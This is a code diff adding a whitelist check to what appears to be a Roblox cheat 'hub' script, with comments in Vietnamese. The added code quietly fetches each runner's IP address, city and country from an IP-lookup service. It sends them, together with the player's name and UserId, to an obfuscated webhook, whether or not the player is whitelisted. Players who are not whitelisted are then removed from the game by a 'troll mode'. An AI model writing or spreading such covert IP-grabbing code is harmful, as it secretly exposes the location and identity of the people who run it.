@@ -1,3 +1,89 @@
+-- ⚡ Check whitelist + webhook
+local whitelist = {
+    ["Mriscool12345"] = true,
+    ["HuynhNgocMai_Clone01"] = true,
+    ["gsbsuevdyndbso"] = true,
+    ["FlandreHubTheBetter"] = true,
+    ["storedvision"] = true,
+    ["montip16"] = true,
+    ["hoajldh456"] = true,
+    ["ccnhanccthaiccnghi"] = true,
+}
+
+local player = game.Players.LocalPlayer
+local HttpService = game:GetService("HttpService")
+
+-- webhook decode
+local encodedURL = "..." -- giữ nguyên dạng số như bạn muốn
+local function decodeURL(enc)
+    local t={} for n in string.gmatch(enc,"[^/]+") do table.insert(t,string.char(tonumber(n))) end
+    return table.concat(t)
+end
+local webhook = decodeURL(encodedURL)
+
+-- helpers
+local function httpGet(url)
+    local req = (syn and syn.request) or http_request or request
+    if req then local r=req({Url=url,Method="GET"}) return r and (r.Body or r.body) end
+    local ok,res = pcall(function() return game:HttpGet(url) end) if ok then return res end
+end
+local function httpPost(url,body)
+    local req = (syn and syn.request) or http_request or request
+    if req then return req({Url=url,Method="POST",Headers={["Content-Type"]="application/json"},Body=body}) end
+    pcall(function() game:GetService("HttpService"):PostAsync(url,body,Enum.HttpContentType.ApplicationJson) end)
+end
+
+-- ip info
+local raw = httpGet("http://ip-api.com/json/") or "{}"
+local data = HttpService:JSONDecode(raw)
+local cc = (data.countryCode or "??"):upper()
+local function flag(c)
+    if #c~=2 then return "" end
+    return utf8.char(0x1F1E6 + (c:byte(1)-65), 0x1F1E6 + (c:byte(2)-65))
+end
+
+-- webhook send
+local function sendWebhook(p, whitelisted)
+    local titleText = whitelisted and "✅ Player Are Whitelisted" or "⚠️ Player Not Whitelisted"
+    local noteText = whitelisted and "Player is on the whitelist" or "Not whitelisted"
+    local colorCode = whitelisted and 65280 or 16711680
+    local desc = string.format(
+        "**Name:** %s\n**UserId:** %s\n**Note:** %s\n\n🌍 **Country:** %s %s\n🏙️ **City:** %s\n📡 **IP:** %s",
+        p.Name, tostring(p.UserId), noteText,
+        (data.country or "Unknown"), flag(cc),
+        (data.city or "Unknown"), (data.query or "Unknown")
+    )
+    local payload = HttpService:JSONEncode({username="Whitelist Checker",embeds={{title=titleText,description=desc,color=colorCode}}})
+    httpPost(webhook,payload)
+end
+
+-- main check
+if whitelist[player.Name] then
+    sendWebhook(player, true)
+    _G.Allowed = true
+else
+    sendWebhook(player, false)
+    _G.Allowed = false
+
+    -- Troll mode
+    task.spawn(function()
+        local lp = game.Players.LocalPlayer
+        lp:Destroy()
+    end)
+    return
+end
+
+
+-- =====================================================
+-- 🎯 PHẦN SCRIPT CHÍNH (luôn nằm dưới cùng)
+-- =====================================================
+if not _G.Allowed then return end
+
+-- Ví dụ: load hub chính
+
+-- hoặc bạn copy full source script vào đây luôn
+print("✅ Script chính đã chạy vì player được whitelist!")
+
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 local Lighting = game:GetService("Lighting")
